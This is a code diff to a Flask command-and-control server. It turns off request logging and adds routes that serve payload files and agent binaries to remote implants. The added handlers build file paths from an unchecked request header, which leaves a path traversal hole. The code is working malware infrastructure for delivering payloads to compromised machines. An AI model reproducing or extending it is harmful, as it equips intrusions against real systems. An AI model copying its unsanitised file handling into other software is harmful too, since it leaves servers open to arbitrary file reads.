@@ -9,8 +9,12 @@ from collections import defaultdict
 from models.command import Command, CommandStatus
 from models.command_result import CommandResult
 from string import Template
+import logging
 
 app = Flask(__name__)
+# Disable Flask's default request logging
+log = logging.getLogger("werkzeug")
+log.setLevel(logging.ERROR)
 
 # Store agents and their pending commands
 agents = {}
@@ -172,15 +176,49 @@ def check_command_status(command_id):
 # Download file
 @app.route("/file/download", methods=["POST"])
 def download():
+    print("download")
     try:
         file_name = request.headers.get("File")
+        print(file_name)
 
         if not file_name:
             return jsonify({"error": "Missing file name"}), 400
 
         file_path = f"./c2server/payloads/{file_name}"
+        # TODO fix this
         if not os.path.exists(file_path):
             file_path = f"./c2server/payloads/dynamic_payloads/{file_name}"
+        with open(file_path, "rb") as f:
+            file_data = f.read()
+
+        headers = {
+            "Content-Disposition": f'attachment; filename="{file_name}"',
+            "FILENAME": file_name,
+        }
+
+        return file_data, 200, headers
+
+    except FileNotFoundError:
+        return jsonify({"error": "File not found"}), 404
+    except Exception as e:
+        return jsonify({"error": f"Internal server error: {str(e)}"}), 500
+
+
+# Download file
+@app.route("/agent/download", methods=["POST"])
+def agent_download():
+    print("agent download")
+    try:
+        file_name = request.headers.get("File")
+        print(file_name)
+
+        if not file_name:
+            return jsonify({"error": "Missing file name"}), 400
+
+        file_path = f"./c2server/agents/{file_name}"
+        if not os.path.exists(file_path):
+            return jsonify({"error": "File not found"}), 404
+
         with open(file_path, "rb") as f:
             file_data = f.read()
 
